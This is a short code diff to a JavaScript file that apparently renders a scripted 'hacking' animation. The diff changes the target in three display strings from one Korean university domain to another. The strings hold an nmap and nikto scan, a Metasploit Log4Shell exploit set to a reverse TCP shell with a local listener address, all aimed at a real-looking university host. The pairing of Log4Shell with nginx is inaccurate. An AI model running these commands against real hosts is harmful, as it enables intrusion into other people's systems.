@@ -107,7 +107,7 @@ const README_LINES = [
 
 const HACK_SEQUENCE = [
   '── Phase 1 : Reconnaissance ─────────────────────────────',
-  '$ nmap -sV -sC -T4 -p- nl.dankook.ac.kr',
+  '$ nmap -sV -sC -T4 -p- nl.seoultech.ac.kr',
   '',
   '  PORT     STATE  SERVICE   VERSION',
   '  22/tcp   open   ssh       OpenSSH 8.9p1 Ubuntu',
@@ -117,7 +117,7 @@ const HACK_SEQUENCE = [
   '  8080/tcp open   http      Node.js Express',
   '',
   '── Phase 2 : Vulnerability Scan ─────────────────────────',
-  '$ nikto -h https://nl.dankook.ac.kr',
+  '$ nikto -h https://nl.seoultech.ac.kr',
   '$ searchsploit nginx 1.18',
   '',
   '  [!] CVE-2021-44228  Log4Shell — JNDI injection (CVSS 10.0)',
@@ -127,7 +127,7 @@ const HACK_SEQUENCE = [
   '── Phase 3 : Exploitation ───────────────────────────────',
   '$ msfconsole -q',
   'msf6 > use exploit/multi/misc/log4shell_header_injection',
-  'msf6 > set RHOSTS nl.dankook.ac.kr',
+  'msf6 > set RHOSTS nl.seoultech.ac.kr',
   'msf6 > set PAYLOAD linux/x64/shell_reverse_tcp',
   'msf6 > set LHOST 10.10.14.23',
   'msf6 > run',
